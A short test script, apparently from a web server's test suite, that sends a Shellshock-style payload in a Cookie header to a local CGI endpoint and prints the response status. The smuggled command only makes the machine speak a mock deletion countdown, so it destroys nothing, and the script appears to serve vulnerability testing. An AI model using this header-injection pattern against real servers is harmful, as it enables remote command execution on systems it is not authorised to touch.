let http = new Http
let exploit = '() { :; }; /usr/bin/say -v zarvox In ten seconds all files will be removed, 10 ........... 9 ........... 8 ........... 7 ........... 6 ........... 5 ........... 4 ............ 3 ............ 2 ............ 1 ............ rm minus f r star'
http.setHeader('Cookie', exploit)
http.get(':4100/cgi-bin/script')
print(http.status)
http.close()
